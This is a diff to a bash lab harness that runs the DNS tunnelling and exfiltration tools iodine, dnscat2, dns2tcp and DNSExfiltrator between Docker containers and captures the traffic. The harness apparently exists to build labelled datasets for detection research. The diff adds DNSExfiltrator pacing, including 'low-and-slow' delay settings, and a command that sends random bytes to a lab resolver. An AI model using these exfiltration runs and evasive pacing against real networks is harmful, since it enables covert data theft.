@@ -19,7 +19,8 @@
 # `-I` (whole seconds, so it is rounded up). Use it for low-and-slow runs (--delay 5000
 # is one dnscat2 query every 5 s). dnscat2 `--rate N` is shorthand for --delay 1000/N.
 # On iodine, --delay also sends the payload as one small chunk per delay, so the tunnel
-# carries a few queries per delay instead of a steady stream.
+# carries a few queries per delay instead of a steady stream. On dnsexfiltrator, --delay
+# is the gap between queries (instead of --rate), e.g. --delay 10000 for one every 10 s.
 # --qtype (iodine, dnscat2) forces the DNS record type, e.g. TXT, CNAME, MX, NULL.
 # --encoding (iodine) forces the downstream encoding: Base32, Base64, Base64u, Base128, Raw.
 # --minutes on iodine/dnscat2 keeps the tunnel and the capture open until that many
@@ -60,7 +61,7 @@ BENIGN_HOSTS=0
 MANIFEST_HEADER="file,tool,client_ip,size_bytes,rate,rate_unit,throttle_ms,qtype,encoding,minutes,benign_hosts,start_utc,end_utc,queries,pcap_bytes,sha256,git"
 
 usage() {
-  sed -n '2,34p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'
+  sed -n '2,35p' "${BASH_SOURCE[0]}" | sed 's/^# \{0,1\}//'
   exit "${1:-0}"
 }
 
@@ -132,8 +133,23 @@ case "$TOOL" in
       DNSCAT_DELAY="$DELAY" DNSCAT_STEADY=1 THROTTLE="$DELAY"
     fi
     ;;
+  dnsexfiltrator)
+    [[ -z "$QTYPE$ENCODING" ]] || { echo "dnsexfiltrator takes --base32, not --qtype or --encoding" >&2; exit 2; }
+    [[ -z "$DELAY" || -z "$RATE" ]] || { echo "dnsexfiltrator: give --rate (queries/s) or --delay (ms), not both" >&2; exit 2; }
+    # The client paces one query per 1/rate seconds and takes a fractional rate, so a
+    # --delay in ms is handed over as 1000/delay queries per second.
+    EXFIL_RATE=5
+    if [[ -n "$DELAY" ]]; then
+      ((DELAY >= 1)) || { echo "--delay must be at least 1 ms" >&2; exit 2; }
+      EXFIL_RATE="$(awk -v d="$DELAY" 'BEGIN { printf "%.6f", 1000 / d }')"
+      THROTTLE="$DELAY"
+    elif [[ -n "$RATE" ]]; then
+      EXFIL_RATE="$RATE"
+      if ((RATE > 0)); then THROTTLE="$((1000 / RATE))"; fi
+    fi
+    ;;
   *)
-    [[ -z "$DELAY$QTYPE$ENCODING" ]] || { echo "--delay, --qtype and --encoding only apply to iodine and dnscat2" >&2; exit 2; }
+    [[ -z "$DELAY$QTYPE$ENCODING" ]] || { echo "dns2tcp takes --size and --rate only" >&2; exit 2; }
     ;;
 esac
 
@@ -154,7 +170,9 @@ start_capture() {
   local container="$1"
   # A run that failed earlier can leave its tcpdump behind; stop it before starting ours.
   docker exec "$container" sh -c 'pkill tcpdump' 2>/dev/null || true
-  docker exec -d "$container" sh -c "rm -f /tmp/cap.pcap; tcpdump -qi eth0 -w /tmp/cap.pcap udp >/dev/null 2>&1"
+  # -U writes each packet as it arrives: without it the last buffered packets are lost
+  # when tcpdump is stopped (measured: 7 of 11 queries kept on a slow DNSExfiltrator run).
+  docker exec -d "$container" sh -c "rm -f /tmp/cap.pcap; tcpdump -U -qi eth0 -w /tmp/cap.pcap udp >/dev/null 2>&1"
   sleep 1 # tcpdump needs a moment to attach; a fast transfer would otherwise finish unseen
   START_UTC="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
   echo "capturing udp on $container"
@@ -210,7 +228,6 @@ case "$TOOL" in
   dnsexfiltrator)
     # --rate is queries/second, the unit the card names. The file is generated on the
     # client container so the source host label matches a real compromised host.
-    [[ -n "$RATE" ]] || RATE=5
     docker exec dnsexfiltrator-cli python3 -c "
 import os, pathlib
 pathlib.Path('/out/payload.bin').write_bytes(os.urandom($SIZE))
@@ -218,7 +235,7 @@ print('payload', $SIZE, 'bytes')
 "
     [[ "$CAPTURE" -eq 1 ]] && start_capture dnsexfiltrator-ns "$PCAP"
     docker exec dnsexfiltrator-cli python3 client.py /out/payload.bin \
-      "$EXFIL_DOMAIN" "$EXFIL_PASSWORD" --resolver 172.28.0.41 --rate "$RATE" $([[ "$BASE32" -eq 1 ]] && echo --base32)
+      "$EXFIL_DOMAIN" "$EXFIL_PASSWORD" --resolver 172.28.0.41 --rate "$EXFIL_RATE" $([[ "$BASE32" -eq 1 ]] && echo --base32)
     sleep 1
     [[ "$CAPTURE" -eq 1 ]] && stop_capture dnsexfiltrator-ns "$PCAP"
     # The receiver writes a zip; prove the round trip rather than trusting exit codes.
@@ -384,7 +401,7 @@ if [[ "$CAPTURE" -eq 1 && -n "$PCAP" ]]; then
   # table. dpkt lives in the M2 requirements, so degrade to printing the command if absent.
   ROWS="$OUT/${TOOL}.ndjson"
   PARSE_ARGS=(--tool "$TOOL")
-  case "$TOOL" in iodine | dnscat2) PARSE_ARGS+=(--throttle "$THROTTLE") ;; esac
+  case "$TOOL" in iodine | dnscat2 | dnsexfiltrator) PARSE_ARGS+=(--throttle "$THROTTLE") ;; esac
   if python3 -c "import dpkt" 2>/dev/null; then
     python3 "$REPO_ROOT/scripts/parse_capture.py" "$PCAP" --out "$ROWS" "${PARSE_ARGS[@]}" \
       || { echo "parse_capture failed on $PCAP" >&2; exit 1; }
